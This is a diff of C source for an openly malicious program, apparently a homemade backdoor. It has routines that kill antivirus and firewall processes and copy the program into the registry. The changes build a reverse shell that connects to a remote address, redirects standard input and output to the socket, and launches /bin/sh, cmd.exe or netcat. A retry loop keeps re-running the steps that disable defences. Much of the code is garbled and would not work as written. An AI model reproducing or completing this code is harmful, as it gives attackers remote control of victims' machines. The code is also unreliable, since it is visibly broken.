@@ -40,14 +40,9 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
   char REMOTE_ADDR;
   int REMOTE_PORT;
-
-  } Client;
-
-  typedef struct connection_success {
-
   int x;
 
-  } Connection_success;
+  } Client;
 
   x = 1;
 
@@ -70,7 +65,7 @@ void kill_antivirus()
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
-    if(arq == 0)
+    if(arq == NULL)
         return;
     else
        while( (arq=fgetc(arq)) != 'EOF')
@@ -122,6 +117,12 @@ void copy_to_registry()
   {
 
     struct sockaddr_in s;
+    //int ret;
+    int root;
+
+    //char *window[] = {"#",0};
+    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
+    char *cmd[] = { "/bin/sh", (char *)0 };
 
     XFreeCursor;
 
@@ -170,7 +171,7 @@ void copy_to_registry()
      x = socket(AF_INET, SOCK_STREAM, 0);
 
     /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
-                   comment this if u think desnecessary...    */
+                   comment this if u think necessary...    */
 
      (connect(x, (struct sockaddr *)&s, sizeof(s)));
      if (connect == -1)
@@ -179,16 +180,19 @@ void copy_to_registry()
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-    // listen(x,10);
-
-
      /* don't freeze the memory, dude */
-     sleep(10);
+     sleep(5);
      /*enter in a shell, finally */
 
-     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0),send(x,"\n#root > /n",7,0);
+     send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
+     if(connect == -1)
+     perror("BREAK CONNECTION,(failure)");
+     else
+     send(x,"\n#root > /n",7,0);
+     fflush(stdout);
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
-     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
+     root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
+     while(1);
 
      }
 
@@ -200,9 +204,18 @@ void copy_to_registry()
 
      int main(int argc, char **argv)
 
-    {
+     {
 
-   /* guarante that this functions will run after the shell */
+      int l;
+
+    /* guarante that this functions will run after the shell
+
+     will veryfic if the condition is true, if not, will repeat 100 times and keep the routine.*/
+
+
+      for(l<=1;l>=100;l++)
+
+      {
 
       auto_copy();
       if(auto_copy == -1)
@@ -220,17 +233,24 @@ void copy_to_registry()
       else
         kill_antivirus();
       kill_firewall();
-      if(kill_firewall == -1)
+      if(kill_firewall == 0)
       perror("kill firewall failed... retrying");
       else
           kill_firewall();
-      sleep(1);
+      sleep(5);
+
+      }
 
     /* shell run while the connection for true */
 
       do {
+
       shell();
+
+      fflush(stdout);
+
       }
+
       while (connect == (true));
       if (connect == 0x0F)
 
